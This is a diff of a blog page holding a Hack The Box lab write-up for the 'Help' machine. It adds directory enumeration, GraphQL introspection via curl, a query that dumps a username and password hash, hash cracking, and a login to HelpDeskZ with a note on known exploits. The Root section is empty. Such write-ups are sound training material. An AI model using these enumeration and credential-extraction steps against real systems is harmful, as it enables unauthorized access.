@@ -26,11 +26,266 @@ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 42.49 seconds
-</code></pre></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://help.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt         
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://help.htb
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              html,txt,php
+[+] Timeout:                 10s
+===============================================================
+2023/06/20 17:43:00 Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 287]
+/.html                (Status: 403) [Size: 288]
+/index.html           (Status: 200) [Size: 11321]
+/support              (Status: 301) [Size: 306] [--&gt; http://help.htb/support/]
+/javascript           (Status: 301) [Size: 309] [--&gt; http://help.htb/javascript/]
+</code></pre><ul><li>Web server</li></ul><p><img src=./images/1.png alt></p><ul><li>Port <code>3000</code></li></ul><p><img src=./images/2.png alt></p><ul><li>If we check the response headers<ul><li>It&rsquo;s says powered by <code>Express</code></li><li>If we google about <code>Express</code> and it&rsquo;s query language we see <code>GraphQL</code></li></ul></li></ul><p><img src=./images/3.png alt></p><h2 id=foothold>Foothold</h2><ul><li>Let&rsquo;s enumerate <code>GraphQL</code><ul><li><a href=https://graphql.org/learn/introspection/ target=_blank rel=noopener>Docs</a></li><li>Query all information regarding types</li><li>We see that we have <code>user</code> query</li><li><code>User</code> type with <code>username</code> and <code>password</code> fields</li></ul></li></ul><pre tabindex=0><code>└─$ curl -s 10.10.10.121:3000/graphql -H &#34;Content-Type: application/json&#34; -d &#39;{ &#34;query&#34;: &#34;{ __schema { types { name, fields { name, description } } } }&#34; }&#39; | jq 
+{
+  &#34;data&#34;: {
+    &#34;__schema&#34;: {
+      &#34;types&#34;: [
+        {
+          &#34;name&#34;: &#34;Query&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;user&#34;,
+              &#34;description&#34;: &#34;&#34;
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;User&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;username&#34;,
+              &#34;description&#34;: &#34;&#34;
+            },
+            {
+              &#34;name&#34;: &#34;password&#34;,
+              &#34;description&#34;: &#34;&#34;
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;String&#34;,
+          &#34;fields&#34;: null
+        },
+        {
+          &#34;name&#34;: &#34;__Schema&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;types&#34;,
+              &#34;description&#34;: &#34;A list of all types supported by this server.&#34;
+            },
+            {
+              &#34;name&#34;: &#34;queryType&#34;,
+              &#34;description&#34;: &#34;The type that query operations will be rooted at.&#34;
+            },
+            {
+              &#34;name&#34;: &#34;mutationType&#34;,
+              &#34;description&#34;: &#34;If this server supports mutation, the type that mutation operations will be rooted at.&#34;
+            },
+            {
+              &#34;name&#34;: &#34;subscriptionType&#34;,
+              &#34;description&#34;: &#34;If this server support subscription, the type that subscription operations will be rooted at.&#34;
+            },
+            {
+              &#34;name&#34;: &#34;directives&#34;,
+              &#34;description&#34;: &#34;A list of all directives supported by this server.&#34;
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;__Type&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;kind&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;name&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;description&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;fields&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;interfaces&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;possibleTypes&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;enumValues&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;inputFields&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;ofType&#34;,
+              &#34;description&#34;: null
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;__TypeKind&#34;,
+          &#34;fields&#34;: null
+        },
+        {
+          &#34;name&#34;: &#34;Boolean&#34;,
+          &#34;fields&#34;: null
+        },
+        {
+          &#34;name&#34;: &#34;__Field&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;name&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;description&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;args&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;type&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;isDeprecated&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;deprecationReason&#34;,
+              &#34;description&#34;: null
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;__InputValue&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;name&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;description&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;type&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;defaultValue&#34;,
+              &#34;description&#34;: &#34;A GraphQL-formatted string representing the default value for this input value.&#34;
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;__EnumValue&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;name&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;description&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;isDeprecated&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;deprecationReason&#34;,
+              &#34;description&#34;: null
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;__Directive&#34;,
+          &#34;fields&#34;: [
+            {
+              &#34;name&#34;: &#34;name&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;description&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;locations&#34;,
+              &#34;description&#34;: null
+            },
+            {
+              &#34;name&#34;: &#34;args&#34;,
+              &#34;description&#34;: null
+            }
+          ]
+        },
+        {
+          &#34;name&#34;: &#34;__DirectiveLocation&#34;,
+          &#34;fields&#34;: null
+        }
+      ]
+    }
+  }
+}
+</code></pre><ul><li><code>user</code> query returns <code>User</code> type</li></ul><pre tabindex=0><code>└─$ curl -s 10.10.10.121:3000/graphql -H &#34;Content-Type: application/json&#34; -d &#39;{ &#34;query&#34;: &#34;{ __schema { queryType { name, fields { name, description, args {name}, type {name} } } } }&#34; }&#39; | jq 
+{
+  &#34;data&#34;: {
+    &#34;__schema&#34;: {
+      &#34;queryType&#34;: {
+        &#34;name&#34;: &#34;Query&#34;,
+        &#34;fields&#34;: [
+          {
+            &#34;name&#34;: &#34;user&#34;,
+            &#34;description&#34;: &#34;&#34;,
+            &#34;args&#34;: [],
+            &#34;type&#34;: {
+              &#34;name&#34;: &#34;User&#34;
+            }
+          }
+        ]
+      }
+    }
+  }
+}
+</code></pre><ul><li>Let&rsquo;s query</li></ul><pre tabindex=0><code>└─$ curl -s 10.10.10.121:3000/graphql -H &#34;Content-Type: application/json&#34; -d &#39;{ &#34;query&#34;: &#34;{ user { username password } }&#34; }&#39; | jq  
+{
+  &#34;data&#34;: {
+    &#34;user&#34;: {
+      &#34;username&#34;: &#34;helpme@helpme.com&#34;,
+      &#34;password&#34;: &#34;5d3c93182bb20f07b994a7f617e99cff&#34;
+    }
+  }
+}
+</code></pre><ul><li>Crack the hash</li></ul><p><img src=./images/4.png alt></p><ul><li>Let&rsquo;s find a place where we can use those credentials<ul><li>We saw <code>support</code> endpoint in <code>gobuster</code> results let&rsquo;s open it</li></ul></li></ul><p><img src=./images/5.png alt></p><ul><li>Use the creds</li></ul><p><img src=./images/6.png alt></p><ul><li>It&rsquo;s a <a href=https://github.com/helpdesk-z/helpdeskz-dev target=_blank rel=noopener>HelpDeskZ</a><ul><li>Let&rsquo;s find the version</li><li>We have 2 possible exploits related to version <code>&lt;= 1.0.2</code></li></ul></li></ul><p><img src=./images/7.png alt></p><ul><li>The older version of <code>HelpDeskZ</code> have a <code>readme.html</code> file<ul><li><a href=https://github.com/ViktorNova/HelpDeskZ target=_blank rel=noopener>Github</a></li></ul></li></ul><p><img src=./images/8.png alt></p><h2 id=root>Root</h2></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fhelp%2f&text=%5bHTB%5d%20Machine%3a%20Help&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
 <a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fhelp%2f&title=%5bHTB%5d%20Machine%3a%20Help" target=_blank><i class="fab fa-reddit"></i></a>
 <a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fhelp%2f&title=%5bHTB%5d%20Machine%3a%20Help" target=_blank><i class="fab fa-linkedin"></i></a>
 <a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Help&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fhelp%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/linux/help/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
-Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Frolic</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Irked</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
+Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Frolic</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Irked</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
 Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
-<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.23087dfdfb44be28a4f0becea508e281f2ad4037cb0c8496ce1ff8000ef9dc7d.js integrity="sha256-Iwh9/ftEviik8L7OpQjigfKtQDfLDISWzh/4AA753H0=" defer></script></body></html>
+<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>
